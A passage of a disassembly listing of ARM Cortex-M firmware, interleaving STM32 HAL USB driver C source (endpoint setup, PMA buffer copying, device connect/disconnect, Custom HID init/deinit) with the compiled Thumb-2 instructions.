 80084cc:	b29b      	uxth	r3, r3
 80084ce:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80084d2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80084d6:	82bb      	strh	r3, [r7, #20]
 80084d8:	687a      	ldr	r2, [r7, #4]
 80084da:	683b      	ldr	r3, [r7, #0]
 80084dc:	781b      	ldrb	r3, [r3, #0]
 80084de:	009b      	lsls	r3, r3, #2
 80084e0:	441a      	add	r2, r3
 80084e2:	8abb      	ldrh	r3, [r7, #20]
 80084e4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80084e8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80084ec:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80084f0:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80084f4:	b29b      	uxth	r3, r3
 80084f6:	8013      	strh	r3, [r2, #0]

      /* Configure VALID status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 80084f8:	687a      	ldr	r2, [r7, #4]
 80084fa:	683b      	ldr	r3, [r7, #0]
 80084fc:	781b      	ldrb	r3, [r3, #0]
 80084fe:	009b      	lsls	r3, r3, #2
 8008500:	4413      	add	r3, r2
 8008502:	881b      	ldrh	r3, [r3, #0]
 8008504:	b29b      	uxth	r3, r3
 8008506:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800850a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800850e:	827b      	strh	r3, [r7, #18]
 8008510:	8a7b      	ldrh	r3, [r7, #18]
 8008512:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8008516:	827b      	strh	r3, [r7, #18]
 8008518:	8a7b      	ldrh	r3, [r7, #18]
 800851a:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 800851e:	827b      	strh	r3, [r7, #18]
 8008520:	687a      	ldr	r2, [r7, #4]
 8008522:	683b      	ldr	r3, [r7, #0]
 8008524:	781b      	ldrb	r3, [r3, #0]
 8008526:	009b      	lsls	r3, r3, #2
 8008528:	441a      	add	r2, r3
 800852a:	8a7b      	ldrh	r3, [r7, #18]
 800852c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008530:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008534:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008538:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800853c:	b29b      	uxth	r3, r3
 800853e:	8013      	strh	r3, [r2, #0]
    }
  }

  return HAL_OK;
 8008540:	2300      	movs	r3, #0
}
 8008542:	4618      	mov	r0, r3
 8008544:	371c      	adds	r7, #28
 8008546:	46bd      	mov	sp, r7
 8008548:	f85d 7b04 	ldr.w	r7, [sp], #4
 800854c:	4770      	bx	lr

0800854e <USB_SetDevAddress>:
  * @param  address new device address to be assigned
  *          This parameter can be a value from 0 to 255
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_SetDevAddress(USB_TypeDef *USBx, uint8_t address)
{
 800854e:	b480      	push	{r7}
 8008550:	b083      	sub	sp, #12
 8008552:	af00      	add	r7, sp, #0
 8008554:	6078      	str	r0, [r7, #4]
 8008556:	460b      	mov	r3, r1
 8008558:	70fb      	strb	r3, [r7, #3]
  if (address == 0U)
 800855a:	78fb      	ldrb	r3, [r7, #3]
 800855c:	2b00      	cmp	r3, #0
 800855e:	d103      	bne.n	8008568 <USB_SetDevAddress+0x1a>
  {
    /* set device address and enable function */
    USBx->DADDR = (uint16_t)USB_DADDR_EF;
 8008560:	687b      	ldr	r3, [r7, #4]
 8008562:	2280      	movs	r2, #128	; 0x80
 8008564:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
  }

  return HAL_OK;
 8008568:	2300      	movs	r3, #0
}
 800856a:	4618      	mov	r0, r3
 800856c:	370c      	adds	r7, #12
 800856e:	46bd      	mov	sp, r7
 8008570:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008574:	4770      	bx	lr

08008576 <USB_DevConnect>:
  * @brief  USB_DevConnect Connect the USB device by enabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevConnect(USB_TypeDef *USBx)
{
 8008576:	b480      	push	{r7}
 8008578:	b083      	sub	sp, #12
 800857a:	af00      	add	r7, sp, #0
 800857c:	6078      	str	r0, [r7, #4]
  /* Enabling DP Pull-UP bit to Connect internal PU resistor on USB DP line */
  USBx->BCDR |= (uint16_t)USB_BCDR_DPPU;
 800857e:	687b      	ldr	r3, [r7, #4]
 8008580:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 8008584:	b29b      	uxth	r3, r3
 8008586:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800858a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800858e:	b29a      	uxth	r2, r3
 8008590:	687b      	ldr	r3, [r7, #4]
 8008592:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 8008596:	2300      	movs	r3, #0
}
 8008598:	4618      	mov	r0, r3
 800859a:	370c      	adds	r7, #12
 800859c:	46bd      	mov	sp, r7
 800859e:	f85d 7b04 	ldr.w	r7, [sp], #4
 80085a2:	4770      	bx	lr

080085a4 <USB_DevDisconnect>:
  * @brief  USB_DevDisconnect Disconnect the USB device by disabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevDisconnect(USB_TypeDef *USBx)
{
 80085a4:	b480      	push	{r7}
 80085a6:	b083      	sub	sp, #12
 80085a8:	af00      	add	r7, sp, #0
 80085aa:	6078      	str	r0, [r7, #4]
  /* Disable DP Pull-Up bit to disconnect the Internal PU resistor on USB DP line */
  USBx->BCDR &= (uint16_t)(~(USB_BCDR_DPPU));
 80085ac:	687b      	ldr	r3, [r7, #4]
 80085ae:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 80085b2:	b29b      	uxth	r3, r3
 80085b4:	f3c3 030e 	ubfx	r3, r3, #0, #15
 80085b8:	b29a      	uxth	r2, r3
 80085ba:	687b      	ldr	r3, [r7, #4]
 80085bc:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 80085c0:	2300      	movs	r3, #0
}
 80085c2:	4618      	mov	r0, r3
 80085c4:	370c      	adds	r7, #12
 80085c6:	46bd      	mov	sp, r7
 80085c8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80085cc:	4770      	bx	lr

080085ce <USB_ReadInterrupts>:
  * @brief  USB_ReadInterrupts return the global USB interrupt status
  * @param  USBx Selected device
  * @retval USB Global Interrupt status
  */
uint32_t USB_ReadInterrupts(USB_TypeDef const *USBx)
{
 80085ce:	b480      	push	{r7}
 80085d0:	b085      	sub	sp, #20
 80085d2:	af00      	add	r7, sp, #0
 80085d4:	6078      	str	r0, [r7, #4]
  uint32_t tmpreg;

  tmpreg = USBx->ISTR;
 80085d6:	687b      	ldr	r3, [r7, #4]
 80085d8:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80085dc:	b29b      	uxth	r3, r3
 80085de:	60fb      	str	r3, [r7, #12]
  return tmpreg;
 80085e0:	68fb      	ldr	r3, [r7, #12]
}
 80085e2:	4618      	mov	r0, r3
 80085e4:	3714      	adds	r7, #20
 80085e6:	46bd      	mov	sp, r7
 80085e8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80085ec:	4770      	bx	lr

080085ee <USB_EP0_OutStart>:
  * @param  USBx Selected device
  * @param  psetup pointer to setup packet
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EP0_OutStart(USB_TypeDef *USBx, uint8_t *psetup)
{
 80085ee:	b480      	push	{r7}
 80085f0:	b083      	sub	sp, #12
 80085f2:	af00      	add	r7, sp, #0
 80085f4:	6078      	str	r0, [r7, #4]
 80085f6:	6039      	str	r1, [r7, #0]
  UNUSED(psetup);
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 80085f8:	2300      	movs	r3, #0
}
 80085fa:	4618      	mov	r0, r3
 80085fc:	370c      	adds	r7, #12
 80085fe:	46bd      	mov	sp, r7
 8008600:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008604:	4770      	bx	lr

08008606 <USB_WritePMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_WritePMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 8008606:	b480      	push	{r7}
 8008608:	b08b      	sub	sp, #44	; 0x2c
 800860a:	af00      	add	r7, sp, #0
 800860c:	60f8      	str	r0, [r7, #12]
 800860e:	60b9      	str	r1, [r7, #8]
 8008610:	4611      	mov	r1, r2
 8008612:	461a      	mov	r2, r3
 8008614:	460b      	mov	r3, r1
 8008616:	80fb      	strh	r3, [r7, #6]
 8008618:	4613      	mov	r3, r2
 800861a:	80bb      	strh	r3, [r7, #4]
  uint32_t n = ((uint32_t)wNBytes + 1U) >> 1;
 800861c:	88bb      	ldrh	r3, [r7, #4]
 800861e:	3301      	adds	r3, #1
 8008620:	085b      	lsrs	r3, r3, #1
 8008622:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 8008624:	68fb      	ldr	r3, [r7, #12]
 8008626:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint16_t WrVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 8008628:	68bb      	ldr	r3, [r7, #8]
 800862a:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 800862c:	88fa      	ldrh	r2, [r7, #6]
 800862e:	697b      	ldr	r3, [r7, #20]
 8008630:	4413      	add	r3, r2
 8008632:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 8008636:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 8008638:	69bb      	ldr	r3, [r7, #24]
 800863a:	627b      	str	r3, [r7, #36]	; 0x24
 800863c:	e01b      	b.n	8008676 <USB_WritePMA+0x70>
  {
    WrVal = pBuf[0];
 800863e:	69fb      	ldr	r3, [r7, #28]
 8008640:	781b      	ldrb	r3, [r3, #0]
 8008642:	827b      	strh	r3, [r7, #18]
    WrVal |= (uint16_t)pBuf[1] << 8;
 8008644:	69fb      	ldr	r3, [r7, #28]
 8008646:	3301      	adds	r3, #1
 8008648:	781b      	ldrb	r3, [r3, #0]
 800864a:	021b      	lsls	r3, r3, #8
 800864c:	b21a      	sxth	r2, r3
 800864e:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 8008652:	4313      	orrs	r3, r2
 8008654:	b21b      	sxth	r3, r3
 8008656:	827b      	strh	r3, [r7, #18]
    *pdwVal = (WrVal & 0xFFFFU);
 8008658:	6a3b      	ldr	r3, [r7, #32]
 800865a:	8a7a      	ldrh	r2, [r7, #18]
 800865c:	801a      	strh	r2, [r3, #0]
    pdwVal++;
 800865e:	6a3b      	ldr	r3, [r7, #32]
 8008660:	3302      	adds	r3, #2
 8008662:	623b      	str	r3, [r7, #32]

#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */

    pBuf++;
 8008664:	69fb      	ldr	r3, [r7, #28]
 8008666:	3301      	adds	r3, #1
 8008668:	61fb      	str	r3, [r7, #28]
    pBuf++;
 800866a:	69fb      	ldr	r3, [r7, #28]
 800866c:	3301      	adds	r3, #1
 800866e:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 8008670:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8008672:	3b01      	subs	r3, #1
 8008674:	627b      	str	r3, [r7, #36]	; 0x24
 8008676:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8008678:	2b00      	cmp	r3, #0
 800867a:	d1e0      	bne.n	800863e <USB_WritePMA+0x38>
  }
}
 800867c:	bf00      	nop
 800867e:	bf00      	nop
 8008680:	372c      	adds	r7, #44	; 0x2c
 8008682:	46bd      	mov	sp, r7
 8008684:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008688:	4770      	bx	lr

0800868a <USB_ReadPMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_ReadPMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 800868a:	b480      	push	{r7}
 800868c:	b08b      	sub	sp, #44	; 0x2c
 800868e:	af00      	add	r7, sp, #0
 8008690:	60f8      	str	r0, [r7, #12]
 8008692:	60b9      	str	r1, [r7, #8]
 8008694:	4611      	mov	r1, r2
 8008696:	461a      	mov	r2, r3
 8008698:	460b      	mov	r3, r1
 800869a:	80fb      	strh	r3, [r7, #6]
 800869c:	4613      	mov	r3, r2
 800869e:	80bb      	strh	r3, [r7, #4]
  uint32_t n = (uint32_t)wNBytes >> 1;
 80086a0:	88bb      	ldrh	r3, [r7, #4]
 80086a2:	085b      	lsrs	r3, r3, #1
 80086a4:	b29b      	uxth	r3, r3
 80086a6:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 80086a8:	68fb      	ldr	r3, [r7, #12]
 80086aa:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint32_t RdVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 80086ac:	68bb      	ldr	r3, [r7, #8]
 80086ae:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 80086b0:	88fa      	ldrh	r2, [r7, #6]
 80086b2:	697b      	ldr	r3, [r7, #20]
 80086b4:	4413      	add	r3, r2
 80086b6:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 80086ba:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 80086bc:	69bb      	ldr	r3, [r7, #24]
 80086be:	627b      	str	r3, [r7, #36]	; 0x24
 80086c0:	e018      	b.n	80086f4 <USB_ReadPMA+0x6a>
  {
    RdVal = *(__IO uint16_t *)pdwVal;
 80086c2:	6a3b      	ldr	r3, [r7, #32]
 80086c4:	881b      	ldrh	r3, [r3, #0]
 80086c6:	b29b      	uxth	r3, r3
 80086c8:	613b      	str	r3, [r7, #16]
    pdwVal++;
 80086ca:	6a3b      	ldr	r3, [r7, #32]
 80086cc:	3302      	adds	r3, #2
 80086ce:	623b      	str	r3, [r7, #32]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 80086d0:	693b      	ldr	r3, [r7, #16]
 80086d2:	b2da      	uxtb	r2, r3
 80086d4:	69fb      	ldr	r3, [r7, #28]
 80086d6:	701a      	strb	r2, [r3, #0]
    pBuf++;
 80086d8:	69fb      	ldr	r3, [r7, #28]
 80086da:	3301      	adds	r3, #1
 80086dc:	61fb      	str	r3, [r7, #28]
    *pBuf = (uint8_t)((RdVal >> 8) & 0xFFU);
 80086de:	693b      	ldr	r3, [r7, #16]
 80086e0:	0a1b      	lsrs	r3, r3, #8
 80086e2:	b2da      	uxtb	r2, r3
 80086e4:	69fb      	ldr	r3, [r7, #28]
 80086e6:	701a      	strb	r2, [r3, #0]
    pBuf++;
 80086e8:	69fb      	ldr	r3, [r7, #28]
 80086ea:	3301      	adds	r3, #1
 80086ec:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 80086ee:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80086f0:	3b01      	subs	r3, #1
 80086f2:	627b      	str	r3, [r7, #36]	; 0x24
 80086f4:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80086f6:	2b00      	cmp	r3, #0
 80086f8:	d1e3      	bne.n	80086c2 <USB_ReadPMA+0x38>
#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */
  }

  if ((wNBytes % 2U) != 0U)
 80086fa:	88bb      	ldrh	r3, [r7, #4]
 80086fc:	f003 0301 	and.w	r3, r3, #1
 8008700:	b29b      	uxth	r3, r3
 8008702:	2b00      	cmp	r3, #0
 8008704:	d007      	beq.n	8008716 <USB_ReadPMA+0x8c>
  {
    RdVal = *pdwVal;
 8008706:	6a3b      	ldr	r3, [r7, #32]
 8008708:	881b      	ldrh	r3, [r3, #0]
 800870a:	b29b      	uxth	r3, r3
 800870c:	613b      	str	r3, [r7, #16]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 800870e:	693b      	ldr	r3, [r7, #16]
 8008710:	b2da      	uxtb	r2, r3
 8008712:	69fb      	ldr	r3, [r7, #28]
 8008714:	701a      	strb	r2, [r3, #0]
  }
}
 8008716:	bf00      	nop
 8008718:	372c      	adds	r7, #44	; 0x2c
 800871a:	46bd      	mov	sp, r7
 800871c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008720:	4770      	bx	lr
	...

08008724 <USBD_CUSTOM_HID_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008724:	b580      	push	{r7, lr}
 8008726:	b084      	sub	sp, #16
 8008728:	af00      	add	r7, sp, #0
 800872a:	6078      	str	r0, [r7, #4]
 800872c:	460b      	mov	r3, r1
 800872e:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)USBD_malloc(sizeof(USBD_CUSTOM_HID_HandleTypeDef));
 8008730:	2024      	movs	r0, #36	; 0x24
 8008732:	f004 fd05 	bl	800d140 <USBD_static_malloc>
 8008736:	60f8      	str	r0, [r7, #12]

  if (hhid == NULL)
 8008738:	68fb      	ldr	r3, [r7, #12]
 800873a:	2b00      	cmp	r3, #0
 800873c:	d109      	bne.n	8008752 <USBD_CUSTOM_HID_Init+0x2e>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 800873e:	687b      	ldr	r3, [r7, #4]
 8008740:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008744:	687b      	ldr	r3, [r7, #4]
 8008746:	32b0      	adds	r2, #176	; 0xb0
 8008748:	2100      	movs	r1, #0
 800874a:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 800874e:	2302      	movs	r3, #2
 8008750:	e08b      	b.n	800886a <USBD_CUSTOM_HID_Init+0x146>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hhid;
 8008752:	687b      	ldr	r3, [r7, #4]
 8008754:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008758:	687b      	ldr	r3, [r7, #4]
 800875a:	32b0      	adds	r2, #176	; 0xb0
 800875c:	68f9      	ldr	r1, [r7, #12]
 800875e:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 8008762:	687b      	ldr	r3, [r7, #4]
 8008764:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008768:	687b      	ldr	r3, [r7, #4]
 800876a:	32b0      	adds	r2, #176	; 0xb0
 800876c:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 8008770:	687b      	ldr	r3, [r7, #4]
 8008772:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 8008776:	687b      	ldr	r3, [r7, #4]
 8008778:	7c1b      	ldrb	r3, [r3, #16]
 800877a:	2b00      	cmp	r3, #0
 800877c:	d11b      	bne.n	80087b6 <USBD_CUSTOM_HID_Init+0x92>
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 800877e:	4b3d      	ldr	r3, [pc, #244]	; (8008874 <USBD_CUSTOM_HID_Init+0x150>)
 8008780:	781b      	ldrb	r3, [r3, #0]
 8008782:	f003 020f 	and.w	r2, r3, #15
 8008786:	6879      	ldr	r1, [r7, #4]
 8008788:	4613      	mov	r3, r2
 800878a:	009b      	lsls	r3, r3, #2
 800878c:	4413      	add	r3, r2
 800878e:	009b      	lsls	r3, r3, #2
 8008790:	440b      	add	r3, r1
 8008792:	3326      	adds	r3, #38	; 0x26
 8008794:	2205      	movs	r2, #5
 8008796:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008798:	4b37      	ldr	r3, [pc, #220]	; (8008878 <USBD_CUSTOM_HID_Init+0x154>)
 800879a:	781b      	ldrb	r3, [r3, #0]
 800879c:	f003 020f 	and.w	r2, r3, #15
 80087a0:	6879      	ldr	r1, [r7, #4]
 80087a2:	4613      	mov	r3, r2
 80087a4:	009b      	lsls	r3, r3, #2
 80087a6:	4413      	add	r3, r2
 80087a8:	009b      	lsls	r3, r3, #2
 80087aa:	440b      	add	r3, r1
 80087ac:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 80087b0:	2205      	movs	r2, #5
 80087b2:	801a      	strh	r2, [r3, #0]
 80087b4:	e01a      	b.n	80087ec <USBD_CUSTOM_HID_Init+0xc8>
  }
  else   /* LOW and FULL-speed endpoints */
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 80087b6:	4b2f      	ldr	r3, [pc, #188]	; (8008874 <USBD_CUSTOM_HID_Init+0x150>)
 80087b8:	781b      	ldrb	r3, [r3, #0]
 80087ba:	f003 020f 	and.w	r2, r3, #15
 80087be:	6879      	ldr	r1, [r7, #4]
 80087c0:	4613      	mov	r3, r2
 80087c2:	009b      	lsls	r3, r3, #2
 80087c4:	4413      	add	r3, r2
 80087c6:	009b      	lsls	r3, r3, #2
 80087c8:	440b      	add	r3, r1
 80087ca:	3326      	adds	r3, #38	; 0x26
 80087cc:	2205      	movs	r2, #5
 80087ce:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 80087d0:	4b29      	ldr	r3, [pc, #164]	; (8008878 <USBD_CUSTOM_HID_Init+0x154>)
 80087d2:	781b      	ldrb	r3, [r3, #0]
 80087d4:	f003 020f 	and.w	r2, r3, #15
 80087d8:	6879      	ldr	r1, [r7, #4]
 80087da:	4613      	mov	r3, r2
 80087dc:	009b      	lsls	r3, r3, #2
 80087de:	4413      	add	r3, r2
 80087e0:	009b      	lsls	r3, r3, #2
 80087e2:	440b      	add	r3, r1
 80087e4:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 80087e8:	2205      	movs	r2, #5
 80087ea:	801a      	strh	r2, [r3, #0]
  }

  /* Open EP IN */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDInEpAdd, USBD_EP_TYPE_INTR,
 80087ec:	4b21      	ldr	r3, [pc, #132]	; (8008874 <USBD_CUSTOM_HID_Init+0x150>)
 80087ee:	7819      	ldrb	r1, [r3, #0]
 80087f0:	2302      	movs	r3, #2
 80087f2:	2203      	movs	r2, #3
 80087f4:	6878      	ldr	r0, [r7, #4]
 80087f6:	f004 fa6f 	bl	800ccd8 <USBD_LL_OpenEP>
                       CUSTOM_HID_EPIN_SIZE);

  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 1U;
 80087fa:	4b1e      	ldr	r3, [pc, #120]	; (8008874 <USBD_CUSTOM_HID_Init+0x150>)
 80087fc:	781b      	ldrb	r3, [r3, #0]
 80087fe:	f003 020f 	and.w	r2, r3, #15
 8008802:	6879      	ldr	r1, [r7, #4]
 8008804:	4613      	mov	r3, r2
 8008806:	009b      	lsls	r3, r3, #2
 8008808:	4413      	add	r3, r2
 800880a:	009b      	lsls	r3, r3, #2
 800880c:	440b      	add	r3, r1
 800880e:	3324      	adds	r3, #36	; 0x24
 8008810:	2201      	movs	r2, #1
 8008812:	801a      	strh	r2, [r3, #0]

  /* Open EP OUT */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDOutEpAdd, USBD_EP_TYPE_INTR,
 8008814:	4b18      	ldr	r3, [pc, #96]	; (8008878 <USBD_CUSTOM_HID_Init+0x154>)
 8008816:	7819      	ldrb	r1, [r3, #0]
 8008818:	2302      	movs	r3, #2
 800881a:	2203      	movs	r2, #3
 800881c:	6878      	ldr	r0, [r7, #4]
 800881e:	f004 fa5b 	bl	800ccd8 <USBD_LL_OpenEP>
                       CUSTOM_HID_EPOUT_SIZE);

  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 1U;
 8008822:	4b15      	ldr	r3, [pc, #84]	; (8008878 <USBD_CUSTOM_HID_Init+0x154>)
 8008824:	781b      	ldrb	r3, [r3, #0]
 8008826:	f003 020f 	and.w	r2, r3, #15
 800882a:	6879      	ldr	r1, [r7, #4]
 800882c:	4613      	mov	r3, r2
 800882e:	009b      	lsls	r3, r3, #2
 8008830:	4413      	add	r3, r2
 8008832:	009b      	lsls	r3, r3, #2
 8008834:	440b      	add	r3, r1
 8008836:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 800883a:	2201      	movs	r2, #1
 800883c:	801a      	strh	r2, [r3, #0]

  hhid->state = CUSTOM_HID_IDLE;
 800883e:	68fb      	ldr	r3, [r7, #12]
 8008840:	2200      	movs	r2, #0
 8008842:	f883 2020 	strb.w	r2, [r3, #32]

  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->Init();
 8008846:	687b      	ldr	r3, [r7, #4]
 8008848:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800884c:	687a      	ldr	r2, [r7, #4]
 800884e:	33b0      	adds	r3, #176	; 0xb0
 8008850:	009b      	lsls	r3, r3, #2
 8008852:	4413      	add	r3, r2
 8008854:	685b      	ldr	r3, [r3, #4]
 8008856:	685b      	ldr	r3, [r3, #4]
 8008858:	4798      	blx	r3

#ifndef USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED
  /* Prepare Out endpoint to receive 1st packet */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 800885a:	4b07      	ldr	r3, [pc, #28]	; (8008878 <USBD_CUSTOM_HID_Init+0x154>)
 800885c:	7819      	ldrb	r1, [r3, #0]
 800885e:	68fa      	ldr	r2, [r7, #12]
 8008860:	230f      	movs	r3, #15
 8008862:	6878      	ldr	r0, [r7, #4]
 8008864:	f004 fbea 	bl	800d03c <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
#endif /* USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED */

  return (uint8_t)USBD_OK;
 8008868:	2300      	movs	r3, #0
}
 800886a:	4618      	mov	r0, r3
 800886c:	3710      	adds	r7, #16
 800886e:	46bd      	mov	sp, r7
 8008870:	bd80      	pop	{r7, pc}
 8008872:	bf00      	nop
 8008874:	200000a6 	.word	0x200000a6
 8008878:	200000a7 	.word	0x200000a7

0800887c <USBD_CUSTOM_HID_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800887c:	b580      	push	{r7, lr}
 800887e:	b082      	sub	sp, #8
 8008880:	af00      	add	r7, sp, #0
 8008882:	6078      	str	r0, [r7, #4]
 8008884:	460b      	mov	r3, r1
 8008886:	70fb      	strb	r3, [r7, #3]
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close CUSTOM_HID EP IN */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDInEpAdd);
 8008888:	4b37      	ldr	r3, [pc, #220]	; (8008968 <USBD_CUSTOM_HID_DeInit+0xec>)
 800888a:	781b      	ldrb	r3, [r3, #0]
 800888c:	4619      	mov	r1, r3
 800888e:	6878      	ldr	r0, [r7, #4]
 8008890:	f004 fa60 	bl	800cd54 <USBD_LL_CloseEP>
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 0U;
 8008894:	4b34      	ldr	r3, [pc, #208]	; (8008968 <USBD_CUSTOM_HID_DeInit+0xec>)
 8008896:	781b      	ldrb	r3, [r3, #0]
 8008898:	f003 020f 	and.w	r2, r3, #15
 800889c:	6879      	ldr	r1, [r7, #4]
 800889e:	4613      	mov	r3, r2
 80088a0:	009b      	lsls	r3, r3, #2
 80088a2:	4413      	add	r3, r2
 80088a4:	009b      	lsls	r3, r3, #2
 80088a6:	440b      	add	r3, r1
 80088a8:	3324      	adds	r3, #36	; 0x24
 80088aa:	2200      	movs	r2, #0
